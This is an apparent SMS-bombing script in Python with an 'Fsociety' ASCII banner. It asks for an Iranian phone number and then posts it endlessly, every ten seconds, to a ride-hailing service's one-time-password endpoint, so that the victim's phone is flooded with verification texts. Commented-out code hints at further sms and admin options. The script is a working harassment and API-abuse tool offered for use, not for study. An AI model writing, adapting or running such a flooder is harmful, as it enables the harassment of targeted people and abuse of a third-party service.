import requests
import time
import os

os.system("cls")

print(" ")
print("  =================================================================  ")
print("||                                                                 ||")
print("||  ------    ------       ------       -----   -----  ----------  ||")
print("||  |     \  /     |      /      \      |   |   |   |  |_      _|  ||")
print("||  |  |\  \/  /|  |     /   /\   \     |    ---    |    |    |    ||")
print("||  |  | \    / |  |    /   /__\   \    |    ___    |    |    |    ||")
print("||  |  |  ----  |  |   /   ------   \   |   |   |   |   _|    |_   ||")
print("||  |__|        |__|  /___/      \___\  |___|   |___|  |________|  ||")
print("||                                                                 ||")
print("||                                                         Fsociety||")
print("  =================================================================  ")


phone = input("Please Enter the phone number(9123456789): ")
url1 = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
url2 = ""

while True:
    number = {"cellphone":"+98" + phone}
    req = requests.post(url=url1, data=number)
    print(req.reason)
    time.sleep(10)


#import getopt
# argument = sys.argv[1:]
# short_options = "hpsa"
# long_options = ["help", "port", "sms", "admin"]
# try:
#     arguments, values = getopt.getopt(argument, short_options, long_options)
#     for x, y in arguments :
#         if x in ("-h", "--help"):
#             usage()
#         elif x in ("-p", "--port"):
#             port()
#         elif x in ("-a", "--admin"):
#             admin()
#         elif x in ("-s", "--sms"):
#             sms()
#         else:
#             print("Invalid syntax")
# except getopt.error as err:
#     print(str(err))

# if len(sys.argv[1:]) == 0:
#     banner()
#     print(Fore.YELLOW + "\n    for more information type -h or --help")

